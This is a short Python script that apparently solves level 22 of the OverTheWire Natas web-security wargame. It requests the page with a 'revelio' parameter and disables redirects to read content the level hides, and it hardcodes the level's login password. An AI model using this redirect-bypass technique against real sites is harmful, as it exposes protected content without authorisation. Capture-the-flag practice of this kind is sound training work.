import requests

target = 'http://natas22.natas.labs.overthewire.org/?revelio=1'
auth = ('natas22', 'd8rwGBl0Xslg3b76uh3fEbSlnOUBlozz')

session=requests.Session()
response = session.get(target, auth=auth,allow_redirects=False)
print(response.text)